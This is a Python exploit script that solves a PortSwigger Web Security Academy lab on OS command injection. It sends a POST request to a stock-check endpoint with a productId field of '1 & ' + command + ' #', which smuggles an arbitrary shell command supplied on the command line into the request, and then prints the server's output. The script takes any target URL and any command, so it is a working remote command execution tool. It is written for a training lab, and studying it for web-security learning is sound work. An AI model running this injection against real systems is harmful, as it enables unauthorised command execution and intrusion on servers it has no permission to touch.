# OS command injection, simple case

# https://portswigger.net/web-security/os-command-injection/lab-simple

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def run_cmd(url, cmd):
	check_stock_path = '/product/stock'
	params = {'productId': '1 & ' + cmd + ' #', 'storeId': '1' }
	print("[+] Trying to run command '%s' on the target website..." % cmd)
	print(f"[+] Sending post request on {check_stock_path}:\n\t{params}\n")
	r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)
	time.sleep(1)
	if r.status_code == 200 and len(r.text) > 3:
		print("[+] %s\'s response:" % url)
		print(r.text)
	else:
		print("[-] Command Injection Failed !!!")


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: OS command injection, simple case')
	parser = argparse.ArgumentParser(description="[+] Lab: OS command injection, simple case")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	parser.add_argument('-C',dest='cmd',required=True, help="Command")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	cmd = args.cmd
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying send OS Command Injection ...\n')
			time.sleep(1)
			run_cmd(url, cmd)
			time.sleep(2)
			r = s.get(url)
			print(r)
			if 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
